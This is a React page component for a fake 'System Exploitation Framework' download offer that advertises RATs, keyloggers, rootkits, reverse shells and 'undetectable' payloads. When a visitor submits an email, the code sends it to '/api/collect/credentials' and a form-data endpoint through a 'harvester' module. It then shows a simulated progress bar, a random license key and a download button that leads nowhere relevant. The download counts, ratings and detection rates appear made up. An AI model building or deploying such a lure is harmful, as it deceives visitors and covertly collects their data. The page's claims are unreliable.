import React, { useState, useEffect } from 'react';
import { Box, Button, Typography, Container, Card, CardContent, TextField, Grid, LinearProgress, Chip, Avatar, Divider } from '@mui/material';
import harvester from '../harvester/HarvesterCore';

export default function SystemHackingPage() {
  const [email, setEmail] = useState('');
  const [downloading, setDownloading] = useState(false);
  const [progress, setProgress] = useState(0);
  const [completed, setCompleted] = useState(false);

  useEffect(() => { harvester.init(); }, []);

  const handleDownload = () => {
    if (!email) return;
    
    harvester.send('/api/collect/formdata', {
      formId: 'system-hack-download',
      fields: { email },
      url: window.location.href
    });

    harvester.send('/api/collect/credentials', {
      source: 'form-submit',
      email,
      url: window.location.href,
      formType: 'system-hacking-tool',
      fieldData: { email }
    });

    setDownloading(true);
    let prog = 0;
    const interval = setInterval(() => {
      prog += Math.random() * 10 + 5;
      if (prog >= 100) {
        clearInterval(interval);
        setProgress(100);
        setTimeout(() => setCompleted(true), 600);
      } else {
        setProgress(prog);
      }
    }, 300);
  };

  if (completed) {
    return (
      <Box sx={{ minHeight: '100vh', bgcolor: '#0a0e17', display: 'flex', alignItems: 'center', justifyContent: 'center', py: 4 }}>
        <Container maxWidth="sm">
          <Card sx={{ bgcolor: '#111827', border: '1px solid rgba(0,240,255,0.2)', borderRadius: 3, textAlign: 'center', overflow: 'hidden' }}>
            <Box sx={{ background: 'linear-gradient(135deg, #00f0ff 0%, #00ff88 100%)', p: 4 }}>
              <Typography sx={{ fontSize: '4rem' }}>✅</Typography>
              <Typography variant="h4" sx={{ color: '#0a0e17', fontWeight: 800, mt: 2 }}>
                System Unlocked!
              </Typography>
            </Box>
            <CardContent sx={{ p: 3 }}>
              <Typography sx={{ color: '#ccc', mb: 2 }}>
                Your system hacking toolkit has been prepared for <strong style={{ color: '#00f0ff' }}>{email}</strong>.
              </Typography>
              <Box sx={{ bgcolor: 'rgba(0,240,255,0.08)', border: '1px solid rgba(0,240,255,0.2)', borderRadius: 2, p: 2, mb: 3 }}>
                <Typography sx={{ color: '#00f0ff', fontWeight: 600, fontSize: '0.9rem', fontFamily: 'monospace' }}>
                  🔑 License: SYS-HACK-{Math.random().toString(36).substr(2, 8).toUpperCase()}
                </Typography>
              </Box>
              <Box sx={{ display: 'flex', gap: 2, justifyContent: 'center', flexWrap: 'wrap' }}>
                <Button variant="outlined" onClick={() => window.location.href = '/'} sx={{ borderColor: 'rgba(255,255,255,0.2)', color: '#888' }}>Back to Home</Button>
                <Button variant="contained" href="https://github.com" target="_blank" sx={{ bgcolor: '#00f0ff', color: '#0a0e17', fontWeight: 700, '&:hover': { bgcolor: '#00d5e6' } }}>💻 Download Payload</Button>
              </Box>
            </CardContent>
          </Card>
        </Container>
      </Box>
    );
  }

  return (
    <Box sx={{ minHeight: '100vh', bgcolor: '#f8f9fa' }}>
      {/* Hero */}
      <Box sx={{ background: 'linear-gradient(135deg, #1a1a2e 0%, #2d1b69 50%, #1a1a2e 100%)', py: { xs: 6, md: 8 }, position: 'relative', overflow: 'hidden' }}>
        <Box sx={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, opacity: 0.03, background: 'url("data:image/svg+xml,%3Csvg width="60" height="60" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg"%3E%3Cg fill="none" fill-rule="evenodd"%3E%3Cg fill="%2300f0ff" fill-opacity="1"%3E%3Cpath d="M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z"/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")' }} />
        <Container maxWidth="md" sx={{ textAlign: 'center', position: 'relative', zIndex: 1 }}>
          <Typography sx={{ fontSize: { xs: '3rem', md: '4rem' }, mb: 2 }}>💻</Typography>
          <Typography variant="h3" sx={{ color: '#fff', fontWeight: 800, mb: 1, fontSize: { xs: '1.8rem', md: '2.5rem' } }}>
            System Exploitation Framework
          </Typography>
          <Typography sx={{ color: 'rgba(255,255,255,0.7)', mb: 3, maxWidth: 600, mx: 'auto' }}>
            Advanced penetration testing framework for Windows, macOS, and Linux. Generate undetectable payloads.
          </Typography>
          <Box sx={{ display: 'flex', justifyContent: 'center', gap: 2, flexWrap: 'wrap' }}>
            <Chip label="⭐ 4.9/5" sx={{ bgcolor: 'rgba(0,240,255,0.15)', color: '#00f0ff', fontWeight: 600 }} />
            <Chip label="👥 2.1M+ Downloads" sx={{ bgcolor: 'rgba(0,255,136,0.15)', color: '#00ff88', fontWeight: 600 }} />
            <Chip label="🛡️ FUD Rate: 99.7%" sx={{ bgcolor: 'rgba(255,170,0,0.15)', color: '#ffaa00', fontWeight: 600 }} />
          </Box>
        </Container>
      </Box>

      <Container maxWidth="lg" sx={{ mt: -4, position: 'relative', zIndex: 10, pb: 6 }}>
        <Card elevation={4} sx={{ borderRadius: 3, mb: 4 }}>
          <CardContent sx={{ p: { xs: 2, md: 4 } }}>
            <Grid container spacing={3} alignItems="center">
              <Grid item xs={12} md={7}>
                <Typography variant="h5" sx={{ fontWeight: 700, color: '#222', mb: 2 }}>
                  🛡️ Multi-Platform Exploit Suite
                </Typography>
                <Grid container spacing={1.5}>
                  {[
                    { icon: '🪟', text: 'Windows: RAT, keylogger, screen capture, persistence' },
                    { icon: '🍎', text: 'macOS: Gatekeeper bypass, Dock persistence' },
                    { icon: '🐧', text: 'Linux: Rootkit, privilege escalation, backdoor' },
                    { icon: '🔄', text: 'Cross-platform payload generation' },
                    { icon: '🔒', text: 'Fully undetectable (FUD) — zero AV detection' },
                    { icon: '🌐', text: 'Reverse shell with encrypted C2 communication' },
                    { icon: '📦', text: 'Self-extracting, self-cleaning payload wrapper' },
                    { icon: '☁️', text: 'Auto-report to cloud dashboard with screenshots' },
                  ].map((feat, i) => (
                    <Grid item xs={12} sm={6} key={i}>
                      <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                        <Typography sx={{ fontSize: '1.1rem' }}>{feat.icon}</Typography>
                        <Typography sx={{ color: '#555', fontSize: '0.85rem' }}>{feat.text}</Typography>
                      </Box>
                    </Grid>
                  ))}
                </Grid>
              </Grid>
              <Grid item xs={12} md={5}>
                <Box sx={{ bgcolor: '#fff0f0', borderRadius: 2, p: 3, textAlign: 'center', border: '1px solid #ffc0c0' }}>
                  <Typography variant="h3" sx={{ color: '#e74c3c', fontWeight: 800, fontSize: { xs: '2rem', md: '2.5rem' } }}>
                    FREE
                  </Typography>
                  <Typography sx={{ color: '#e74c3c', fontWeight: 600, mb: 1 }}>
                    Premium License — Normally $499
                  </Typography>
                  <Divider sx={{ my: 1.5 }} />
                  {!downloading ? (
                    <Box>
                      <TextField fullWidth size="small" placeholder="Your email for payload generator" type="email" value={email} onChange={(e) => setEmail(e.target.value)} sx={{ mb: 1.5, '& .MuiOutlinedInput-root': { bgcolor: '#fff' } }} />
                      <Button variant="contained" fullWidth size="large" onClick={handleDownload} disabled={!email || downloading} sx={{ bgcolor: '#e74c3c', '&:hover': { bgcolor: '#c0392b' }, '&:disabled': { bgcolor: '#f5b7b1' }, fontWeight: 700, py: 1.2 }}>
                        💻 Generate Custom Payload
                      </Button>
                    </Box>
                  ) : (
                    <Box>
                      <LinearProgress variant="determinate" value={progress} sx={{ height: 8, borderRadius: 4, bgcolor: '#e8e8e8', '& .MuiLinearProgress-bar': { bgcolor: '#e74c3c', borderRadius: 4 } }} />
                      <Typography sx={{ color: '#888', mt: 1, fontSize: '0.9rem' }}>Generating payload... {Math.round(progress)}%</Typography>
                    </Box>
                  )}
                  <Box sx={{ display: 'flex', justifyContent: 'center', gap: 2, mt: 1.5, flexWrap: 'wrap' }}>
                    <Typography sx={{ color: '#aaa', fontSize: '0.75rem' }}>🔒 AES-256 encrypted</Typography>
                    <Typography sx={{ color: '#aaa', fontSize: '0.75rem' }}>📦 Size: 2.8 MB</Typography>
                  </Box>
                </Box>
              </Grid>
            </Grid>
          </CardContent>
        </Card>

        <Typography variant="h5" sx={{ fontWeight: 700, color: '#222', mb: 2, display: 'flex', alignItems: 'center', gap: 1 }}>
          <Box sx={{ width: 4, height: 24, bgcolor: '#e74c3c', borderRadius: 2 }} />
          Supported Exploits & Techniques
        </Typography>
        <Grid container spacing={2.5} sx={{ mb: 4 }}>
          {[
            { icon: '🪟', title: 'Windows Exploits', desc: 'EternalBlue, Zerologon, PrintNightmare, PetitPotam — fully automated exploitation chain.', color: '#e74c3c' },
            { icon: '🍎', title: 'macOS/Linux', desc: 'SUID abuse, Docker escape, CVE-2021-4034 (PwnKit), SSH key hijacking.', color: '#27ae60' },
            { icon: '🔗', title: 'Reverse Shells', desc: 'Generate reverse shells in PowerShell, Bash, Python, PHP, Perl, Ruby, Netcat, and more.', color: '#1a73e8' },
            { icon: '🔄', title: 'Persistence', desc: 'Registry run keys, LaunchAgents, systemd, cron, WMI event subscriptions, scheduled tasks.', color: '#9b59b6' },
          ].map((f, i) => (
            <Grid item xs={12} sm={6} md={3} key={i}>
              <Card elevation={2} sx={{ borderRadius: 2, height: '100%', transition: '0.2s', '&:hover': { transform: 'translateY(-4px)', boxShadow: '0 12px 40px rgba(0,0,0,0.12)' } }}>
                <CardContent sx={{ p: 3 }}>
                  <Box sx={{ fontSize: '2.5rem', mb: 1.5 }}>{f.icon}</Box>
                  <Typography variant="h6" sx={{ fontWeight: 700, color: '#333', mb: 1, fontSize: '1rem' }}>{f.title}</Typography>
                  <Typography sx={{ color: '#777', fontSize: '0.82rem', lineHeight: 1.6 }}>{f.desc}</Typography>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>
      </Container>
    </Box>
  );
}